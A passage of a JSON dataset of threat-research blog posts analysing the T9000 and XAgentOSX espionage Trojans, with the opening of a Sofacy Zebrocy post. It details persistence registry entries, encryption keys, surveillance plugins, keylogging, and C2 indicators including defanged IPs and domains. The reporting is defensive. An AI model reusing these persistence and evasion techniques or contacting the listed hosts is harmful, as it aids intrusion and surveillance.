                "D:\\WORK\\T9000\\ResN_M2\\Release\\ResN32.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The ResN32.dll library begins by spawning a new thread that is responsible for the majority of the capabilities built into this sample.",
                "This thread begins by checking the operating system version, and once again runs a query on the various security products installed on the victim machine."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Under certain conditions, the following registry key is set, ensuring persistence across reboots:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\update \u2013 c:\\windows\\system32\\rundll32.exe %APPDATA\\Intel\\ResN32.dll Run"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Following this, a new thread is created that is responsible for deleting previously written files.",
                "This thread creates the following mutex:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Global\\\\deletethread"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It proceeds to attempt to delete the following files in an infinite loop until said files have been deleted:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The ResN32.dll malware proceeds to read in the ResN32.dat file that was previously written to disk.",
                "This file contains a path to the hjwe.dat file, which is subsequently read in."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The data within the hjwe.dat file is decrypted using the RC4 algorithm, and subsequently decompressed using the LZMA algorithm.",
                "The following script can be used to decrypt the hjwe.dat file, along with the plugins that will be discussed later."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this file has been decrypted and decompressed, it is written to a file in the %TEMP% directory with a file prefix of __",
                "__RES.",
                "This file, which contains a Windows DLL, is then loaded into the current process.",
                "After the malicious library has been loaded, the previously written temporary file is deleted.",
                "This begins the last stage of the malware, which will load the core of the malware family."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the decrypted and decompressed hjwe.dat file is loaded, it begins by checking its parent process against the following list.",
                "If the parent process matches the following blacklist, the malicious DLL will exit without performing any malicious activities."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware proceeds to collect the username of the victim, as well as the operating system version.",
                "It then compares its parent process against the following list of executables:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Notice the repeated check for the logonui.exe, as well as the overlap with the previous parent executable check, which implies sloppiness by the malware author."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After these checks are performed, the following mutex is created."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Global\\\\{A59CF429-D0DD-4207-88A1-04090680F714}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following folders are then created:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The path of these folders is determined by the version of Microsoft Windows running.",
                "The following possibilities exist:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At this point, the malware will read in the dtl.dat file, which contains configuration data.",
                "Data contained with this file starting at offset 0x20 is xor-encrypted using a single-byte key of 0x5F.",
                "The following script can be used to extract the IP address and port for the C2 server from this file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware will then read in and parse the included plugin configuration information, which is found within the glp.uin file that was previously dropped.",
                "These included plugins are encrypted and compressed using the same method witnessed by the hjwe.dat file previously.",
                "The previously included script can be used to decrypt and decompress the following three plugin files:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These three plugins are subsequently loaded after being decrypted and decompressed.",
                "An overview of these plugins can be found later in this post."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware proceeds to create the following event:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Global\\\\{34748A26-4EAD-4331-B039-673612E8A5FC}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the following three mutexes are created:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Global\\\\{3C6FB3CA-69B1-454f-8B2F-BD157762810E}\nGlobal\\\\{43EE34A9-9063-4d2c-AACD-F5C62B849089}\nGlobal\\\\{A8859547-C62D-4e8b-A82D-BE1479C684C9}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware will spawn a new thread to handle network communication.",
                "The following event is created prior to this communication occurring:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Global\\\\{EED5CA6C-9958-4611-B7A7-1238F2E1B17E}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware includes proxy support in the event that the victim is behind a web proxy.",
                "Network traffic occurs over a binary protocol on the port specified within the configuration.",
                "Traffic is xor-encrypted with a single-byte key of 0x55 in an attempt to bypass any network security products that may be in place.",
                "Once decrypted, the following traffic is sent by the malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1: Decrypted data sent by malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we can see from the above image, the malware will send out an initial beacon, followed by various collected information from the victim machine.",
                "The following information is exfiltrated:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware is configured to receive a number of commands.",
                "The following command functionalities have been identified."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the following commands have been identified, however, their functionalities have yet to be fully discovered."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When this plugin is called with the default exported function, it will create the following mutex:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "{CE2100CF-3418-4f9a-9D5D-CC7B58C5AC62}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When called with the SetCallbackInterface function export, the malicious capabilities of the plugin begin.",
                "The plugin begins by collecting the username of the running process, and determining if it is running under the SYSTEM account.",
                "If running as SYSTEM, the plugin will associate the active desktop with the plugins thread."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The plugin proceeds to create the following named event:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Global\\\\{EED5CA6C-9958-4611-B7A7-1238F2E1B17E}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Multiple threads are then spawned to handle various actions.",
                "The first thread is responsible for taking a screenshot of the desktop of the victim machine.",
                "This screenshot data is both compressed and encrypted using a single-byte xor key of 0x5F.",
                "This data is written to one of the following files:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "%PUBLIC%\\Downloads\\Update\\S[random].dat\n%ALLUSERSPROFILE%\\Documents\\My Document\\S[random].dat"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The random data is generated via the current system time.",
                "Additionally, when a screenshot is written, one of the following log files has data appended to it:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "%PUBLIC%\\Downloads\\Update\\Log.txt\n%ALLUSERSPROFILE%\\Documents\\My Document\\Log.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2: Example data found within Log.txt file"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A second thread is responsible for monitoring the foreground window every 20 seconds.",
                "The thread will target the window names set within the plugin configuration.",
                "In this particular instance, the malware will target the notepad process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When this process is discovered to be running in the foreground window, the malware will take a screenshot of this window.",
                "The data is compressed and encrypted using a single-byte xor key of 0x5F.",
                "This data is written to one of the following files:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "%PUBLIC%\\Downloads\\Update\\W[random].dat\n%ALLUSERSPROFILE%\\Documents\\My Document\\W[random].dat"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Like the previous thread, this one attempts to write another log file to the disk.",
                "However, due to a bug within the code of this plugin, the malware author attempts to append the C:\\\\Windows\\\\Temp\\\\Log.txt string to the path, resulting in an inaccessible file path.",
                "In the event this bug did not exist, the following example data would be written:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "08:37:49 2000 [4] PrintKeyTitleWnd: ===>> Process ID : 2000"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The third and final thread spawned by this plugin is responsible for collecting information from the Skype program.",
                "The malware will use the built-in Skype API to accomplish this.",
                "This only takes places if both Skype is running and the victim is logged into Skype.",
                "It makes calls to the following functions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When hooking into the Skype API, the victim is presented with the following dialog:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3: Skype API access request"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The victim must explicitly allow the malware to access Skype for this particular functionality to work.",
                "However, since a legitimate process is requesting access, the user may find him- or herself allowing this access without realizing what is actually happening."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once enabled, the malware will record video calls, audio calls, and chat messages.",
                "Audio and video files are stored in the following folder:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "%APPDATA%\\Intel\\Skype"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Temporary audio and video files are stored within the audio and video sub-folders respectively.",
                "After a call is finished, this data is compressed and encrypted using the same techniques previously witnessed.",
                "These files arestored in randomly named .dat files within the Skype folder."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When decrypted, we can see that the malware periodically takes images of the video calls.",
                "Audio calls are stored as .wav files."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4: A lonely malware reverser is captured on video by the malicious plugin"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The original name for this plugin is CaptureDLL.dll.",
                "This is aptly named, as we see that this plugin has the following functionality:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The vnkd.dat plugin has the following debug path, leading us to believe that the original name for this plugin is FlashDiskThief:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "e:\\WORK\\Project\\T9000\\Windows\\Target\\FlashDiskThief.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When loaded with the default DllEntryPoint exported function, it will create the following mutex:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Global\\\\{6BB1120C-16E9-4c91-96D5-04B42D1611B4}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Like the other plugins associated with this malware, the majority of the functionality for this malware resides within the SetCallbackInterface exported function.",
                "This function spawns a new thread that begins by registering a new window with a class name and window name of xx."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The plugin proceeds to iterate through all connected drives on the system, looking for removable drives."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5.",
                "Plugin check for removable drives"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Should a removable drive be discovered, the plugin will seek any files residing on this device based on the plugins configured list.",
                "In this particular instance, the malware will seek out the following file types:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If one of these file types is found, the malware will create a copy of the file in one of the following paths:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "%PUBLIC%\\Downloads\\Update\\D[random].tmp\n%ALLUSERSPROFILE%\\Documents\\My Document\\D[random].tmp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The data found within this file is encrypted using a single-byte xor key of 0x41.",
                "The file header structure, with the underlying data still encrypted, can be seen below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6: File structure prior to decryption"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7: File structure post decryption"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This concludes the functionality of the vnkd.dat plugin, or FlaskDiskThief as its known by the malwares author.",
                "While specific in nature, this plugin allows attackers to collect files being passed around from one machine to another via removable drives."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This particular plugin appears to have an original filename of kplugin.dll due to debugging information found within the file.",
                "The qhnj.dat plugin is responsible for hooking a number of common Microsoft Windows API calls, and logging the results."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following functions are hooked by this plugin:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The plugin is most likely hooking the ImmGetCompositionString* functions in order to collect information about Unicode characters on the victim machine, such as Chinese, Japanese, and Korean."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hooking the various file and directory operations allows the malware to log what file changes are occurring on the system.",
                "When a file is created, copied, moved, or deleted on the system, the malware will check the directory of said file against the following blacklist:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the filename is compared against the .tmp extension to ensure a temporary file is ignored."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Should the file meet the required criteria, this data is logged.",
                "Additionally, all folder modifications and clipboard data are logged as well."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Crypt* functions allow the malware to collect sensitive encrypted data sent to and from the victim machine.",
                "This is especially useful when viewing network traffic, allowing the attackers to potentially gain access to remote systems used by the victim."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All of the data logged by the qhnj.dat plugin file is stored in one of the following file paths.",
                "Data is encrypted using a single-byte XOR key of 0x79."
            ]
        },
        {
            "type": "caption",
            "content": [
                "%PUBLIC%\\Downloads\\Update\\uai[random].tmp\n%ALLUSERSPROFILE%\\Documents\\My Document\\uai[random].tmp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This last plugin allows the attackers to record important actions taken by the victim, which in turn may allow them to gain additional access as well as insight into the victims actions."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "T9000 appears to be the latest version of this Trojan, which has been partially exposed in previous reports.",
                "In 2013, Cylance published a report on a group they named Grand Theft Auto Panda, which includes some details on the T5000 version of this Trojan.",
                "FireEye researchers also noted that the malware was used in an attack in 2014 using a lure related to the disappearance of Malaysian flight MH370."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The author of this backdoor has gone to great lengths to avoid being detected and to evade the scrutiny of the malware analysis community.",
                "We hope that sharing the details of how this tool works as well as the indicators in the section below will help others defend themselves against attacks using this tool."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In a future report, we will detail the infrastructure used by the variants of the malware we have identified and discuss the methods attackers use to infect systems with it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from T9000/T5000 attacks through our next-generation security platform, including the following."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "RTF File, d5fa43be20aa94baf1737289c5034e2235f1393890fb6f4e8d4104565be52d8c\nQQMGr.dll, bf1b00b7430899d33795ef3405142e880ef8dcbda8aab0b19d80875a14ed852f\nQQMGR.inf, ace7e3535f2f1fe32e693920a9f411eea21682c87a8e6661d3b67330cd221a2a\nResN32.dat, aa28db689f73d77babd1c763c53b3e63950f6a15b7c1a974c7481a216dda9afd\nResN32.dll, 1cea4e49bd785378d8beb863bb8eb662042dffd18c85b8c14c74a0367071d9a7\nhqwe.dat, bb73261072d2ef220b8f87c6bb7488ad2da736790898d61f33a5fb7747abf48b\nhqwe.dat.decrypted, 7daf3c3dbecb60bee3d5eb3320b20f2648cf26bd9203564ce162c97dcb132569\nhccutils.dll, 3dfc94605daf51ebd7bbccbb3a9049999f8d555db0999a6a7e6265a7e458cab9\nhccutils.inf, f05cd0353817bf6c2cab396181464c31c352d6dea07e2d688def261dd6542b27\nigfxtray.exe, 21a5818822a0b2d52a068d1e3339ed4c767f4d83b081bf17b837e9b6e112ee61\nqhnj.dat, c61dbc7b51caab1d0353cbba9a8f51f65ef167459277c1c16f15eb6c7025cfe3\nqhnj.dat.decrypted, 2b973adbb2addf62cf36cef9975cb0193a7ff0b960e2cff2c80560126bee6f37\ntyeu.dat, e52b5ed63719a2798314a9c49c42c0ed4eb22a1ac4a2ad30e8bfc899edcea926\ntyeu.dat.decrypted, 5fc3dc25276b01d6cb2fb821b83aa596f1d64ae8430c5576b953e3220a01d9aa\nvnkd.dat, c22b40db7f9f8ebdbde4e5fc3a44e15449f75c40830c88932f9abd541cc78465\nvnkd.dat.decrypted, 157e0a9323eaaa911b3847d64ca0d08be8cd26b2573687be461627e410cb1b3f\ndtl.dat, 00add5c817f89b9ec490885be39398f878fa64a5c3564eaca679226cf73d929e\nglp.uin, 3fa05f2f73a0c44a5f51f28319c4dc5b8198fb25e1cfcbea5327c9f1b3a871d4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mutexes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "820C90CxxA1B084495866C6D95B2595xx1C3\nGlobal\\\\deletethread\nGlobal\\\\{A59CF429-D0DD-4207-88A1-04090680F714}\nGlobal\\\\{3C6FB3CA-69B1-454f-8B2F-BD157762810E}\nGlobal\\\\{43EE34A9-9063-4d2c-AACD-F5C62B849089}\nGlobal\\\\{A8859547-C62D-4e8b-A82D-BE1479C684C9}\n{CE2100CF-3418-4f9a-9D5D-CC7B58C5AC62}\nGlobal\\\\{6BB1120C-16E9-4c91-96D5-04B42D1611B4}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Named Events"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Global\\\\{34748A26-4EAD-4331-B039-673612E8A5FC}\nGlobal\\\\{EED5CA6C-9958-4611-B7A7-1238F2E1B17E}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "File Modifications"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%TEMP%\\~tmp.doc\n%APPDATA%\\Intel\\avinfo\n%APPDATA%\\Intel\\Data\\dtl.dat\n%APPDATA%\\Intel\\Data\\glp.uin\n%APPDATA%\\Intel\\Data\\\n%APPDATA%\\Intel\\~1\n%APPDATA%\\Intel\\hccutils.dll\n%APPDATA%\\Intel\\hccutils.inf\n%APPDATA%\\Intel\\hjwe.dat\n%APPDATA%\\Intel\\igfxtray.exe\n%APPDATA%\\Intel\\qhnj.dat\n%APPDATA%\\Intel\\QQMgr.dll\n%APPDATA%\\Intel\\QQMgr.inf\n%APPDATA%\\Intel\\ResN32.dll\n%APPDATA%\\Intel\\ResN32.dat\n%APPDATA%\\Intel\\tyeu.dat\n%APPDATA%\\Intel\\vnkd.dat\n%STARTUP%\\hccutils.dll\n%STARTUP%\\hccutil.dll\n%STARTUP%\\igfxtray.exe\n%ALLUSERSPROFILE%\\Documents\\My Document\\utd_CE31\n%ALLUSERSPROFILE%\\Documents\\My Document\\XOLOADER\n%ALLUSERSPROFILE%\\Documents\\My Document\\update\n%ALLUSERSPROFILE%\\Documents\\My Document\\Log.txt\n%PUBLIC%\\Downloads\\Update\\utd_CE31\n%PUBLIC%\\Downloads\\Update\\XOLOADER\n%PUBLIC%\\Downloads\\Update\\update\n%PUBLIC%\\Downloads\\Update\\Log.txt\n%APPDATA%\\Intel\\Skype"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Registry Modifications"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Eupdate - %APPDATA%\\Intel\\ResN32.dll\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\update - %SYSTEM%\\rundll32.exe %APPDATA\\Intel\\ResN32.dll Run\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs - %APPDATA%\\Intel\\ResN32.dll\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs  0x1\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\update  c:\\windows\\system32\\rundll32.exe %APPDATA\\Intel\\ResN32.dll Run"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Command and Control"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "198.55.120[.]143:8080"
            ]
        }
    ],
    "3b228714a6d6c097c58c557b41762791dfde3d87": [
        {
            "type": "paragraph",
            "content": [
                "During our continued research on Sofacys Komplex Trojan, we have found a sample of a backdoor Trojan that we believe the Sofacy group uses when targeting individuals running macOS systems.",
                "The backdoor Trojan authors have called it XAgentOSX, which shares the name XAgent with one of Sofacys Windows-based Trojan and references Apples previous name for macOS, OS X. It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Komplex: /Users/kazak/Desktop/Project/komplex"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "XAgent OSX: /Users/kazak/Desktop/Project/XAgentOSX"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macOS variant of XAgent has ability to receive commands from threat actors via its command and control channel, but is also capable of logging key strokes via its keylogger functionality.",
                "XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system.",
                "The Trojan uses HTTP POST requests, as seen in Figure 1 to send data to the C2 server, and GET requests to receive commands from the server, as seen in Figure 2.",
                "We are still analyzing this Trojan to determine the specific structure of the data sent between the Trojan and the C2 server; however, it does appear that the Trojan is using the RC4 algorithm to encrypt data sent to the C2 server within HTTP POST requests."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 XAgent macOS HTTP POST request"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 XAgent mscOS HTTP GET request"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 URLs generated by XAgentOSX are very similar to those created by its Windows-based counterpart.",
                "When generating the URL for the HTTP requests issued to the C2 server, the Trojan chooses a random folder from the following to include within the URL path:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "watch/?\nsearch/?\nfind/?\nresults/?\nopen/?\nsearch/?\nclose/?"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "XAgent also will choose several parameters names from the following list when finishing the construction of the C2 URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "itwm=\ntext=\nfrom=.\nitwm=\nags=\noe=\naq=\nbtnG=\noprnd=\nitwm=\nutm=\nchannel="
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The XAgent OSX Trojan generates a system specific value that it refers to as an \"agent_id\", which is a unique identifier for each compromised host.",
                "The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the \"Hardware UUID\" listed in the system information application, as seen in the Figure 3 screenshot of our analysis system.",
                "The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was \"0000\"."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Hardware ID used by XAgent to uniquely identify compromised hosts"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When generating the URLs within the HTTP POST and GET requests, XAgent sets one HTTP parameter using a specific data structure that contains this agent_id value.",
                "This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system.",
                "The data structure used to transmit the agent_id to the C2 is as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "struct {\nDWORD random_value_for_key;\nCHAR[7] constant_value;\nDWORD agent_id;\n}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The constant value in the data structure is a 7 byte string that is hardcoded to \"\\x56\\x0E\\x9F\\xF0\\xEB\\x98\\x43\", followed by the agent_id value (\"0000\" in our case).",
                "The first DWORD in the data is a random value that the Trojan will use as an XOR key to encrypt the constant value and the agent_id.",
                "For instance, the following 15 bytes were used to generate an HTTP parameter during our analysis:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The resulting ciphertext is then encoded using XAgent's base64 encoding routine that starts by building the following encoding alphabet:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-",
                "_"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As you can see, this is not the standard base64 alphabet, rather it is the \"URL and Filename safe\" Base 64 Alphabet from RFC 4648, as the \"+\" in the standard alphabet is replaced with \"-\" and the \"/\" replaced with \"_\".",
                "It then uses the base64 encoding function with this alphabet to encode the data, which in the above case resulted in:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "D-7Ig1ngV3PkdouzP974"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan then creates a string of 9 random symbols and appends the encoded ciphertext to this random string.",
                "For example, the following string would be included in one of the HTTP parameters sent to the C2 server:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "eRmaVsr90D-7Ig1ngV3PkdouzP974"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this specific case, the actor made a mistake when configuring this XAgent sample with its C2 locations.",
                "The sample creates an array that contains the following strings for the Trojan to use as C2 locations:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://23.227.196[.]215/\nhttp://apple-iclods[.]org/\nhttp://apple-checker[.]org/\nhttp://apple-uptoday[.]org/\nhttp://apple-search[.]info"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Notice the last one is missing the trailing \"/\", which causes an issue when the Trojan attempts to use this string to build the remainder of the C2 URL, as the Trojan will append the next string in the URL directly to this string.",
                "For instance, when using this string we observed DNS queries for \"apple-search.infoclose\", as the string \"close\" was supposed to be the next portion of the C2 URL."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The XAgent C2 server will provide commands for the Trojan to run on the compromised system within its response to inbound HTTP request.",
                "The XAgentOSX Trojan includes responses to commands within HTML tags, which we believe allows the C2 server to format logs for viewing."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In most cases, the responses sent to the C2 server are included between the \"<font size=4 color=000066><pre>\" and \"</pre></font>\" HTML tags.",
                "We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1.",
                "The command handler obtains a command identifier from the C2 server and adds 0xFFFFFF9B to this value and then uses a switch statement to determine the appropriate command to execute.",
                "The switch statement checks for 19 cases, between 101 and 119.(Updated to correct command IDs, thanks @mykill!)"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Commands available within XAgent OSX"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The showBackupIosFolder command is rather interesting, as it allows the threat actors to determine if a compromised system was used to backup an IOS device, such as an iPhone or iPad.",
                "We believe this command is used to determine if a mobile device was backed up, and we speculate that the actors would use other commands within XAgent to exfiltrate those files."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "XAgent also has a keylogger functionality that allows the threat actors to steal credentials as the user types them.",
                "XAgent logs key strokes by calling the CGEventTapCreate function to set an event hook to call a callback function named _myCGEventTapCallBack when it detects pressed keys.",
                "This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes.",
                "The keylogger will monitor for active application windows and write them to the log in the following format:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<span class='keylog_process'>[Application Name]</span>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The keylogger will log a configurable amount of keystrokes (default 50) before sending the log to the C2 server using the following format:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<span class='keylog_user_keys'>[logged keystrokes]</span>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The keylogger can handle logging special keys, such as return and the function keys and will report those within the log in the following format;"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<span class='keylog_spec_key'>[special character]</span>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The XAgentOSX sample we analyzed was configured to use the following IP address and domain names as its C2 servers:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "23.227.196[.]215\napple-iclods[.]org\napple-checker[.]org\napple-uptoday[.]org\napple-search[.]info"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When we analyzed this sample, the domain names that were used as backup C2 locations were not registered; therefore, these domains did not provide any links to additional infrastructure.",
                "We were also unable to find any additional infrastructure based on the primary C2 location of 23.227.196[.]215.",
                "However, according to CrowdStrike, the nearby IP address 23.227.196[.]217 hosted the C2 location for an XTunnel payload used by the Sofacy group in the attack on the Democratic National Committee.",
                "While these IP addresses do not directly overlap, it does appear that the Sofacy group continues to use the same hosting services to host their infrastructure."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Sofacy group continues to bolster their toolset to carry out attack campaigns on multiple platforms.",
                "In this case, the threat group uses the same name XAgent for this macOS-based tool as one of their Windows-based tools.",
                "Also, the macOS variant of this tool uses a similar network communications method as its Windows counterpart, which suggests this group continues to use consolidated C2 services to control compromised hosts, as we saw during our comparison of the Komplex and Seduploader (formerly referred to as Sofacy Carberp) tools.",
                "Also, while we lack attack telemetry, we were able to find a loose connection to the attack campaign that Sofacy waged on the Democratic National Committee based on hosting data in both attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from XAgentOSX via:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2a854997a44f4ba7e307d408ea2d9c1d84dde035c5dab830689aa45c5b5746ea"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Command and Control"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "23.227.196[.]215\napple-iclods[.]org\napple-checker[.]org\napple-uptoday[.]org\napple-search[.]info"
            ]
        }
    ],
    "edcb398a3c3088b8a78bdb21655553c2d0188faf": [
        {
            "type": "paragraph",
            "content": [
                "As alluded to in our previous blog regarding the Cannon tool, the Sofacy group (AKA Fancy Bear, APT28, STRONTIUM, Pawn Storm, Sednit) has persistently attacked various government and private organizations around the world from mid-October 2018 through mid-November 2018.",
                "The majority of targets were NATO-aligned nation states, although several former USSR nation states were also targeted.",
                "The attacks primarily deployed variants of the Zebrocy tool, which we have previously analyzed.",
                "A smaller subset of the delivery documents delivered Cannon or a Zebrocy Delphi variant as reported by ESET.",
                "Since we began tracking the use of Zebrocy going back to mid-2015, we have observed a significant increase in frequency of deployment of this tool.",
                "Compared to other backdoor tools associated with the Sofacy group, the use of Zebrocy in attack campaigns is far more widespread."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The cluster of activity we detail in this blog revolves primarily around a common author name used in each of the delivery documents: Joohn.",
                "Our initial sample of interest was the delivery document using the crash list(Lion Air Boeing 737).docx filename, which delivered the Zebrocy tool.",
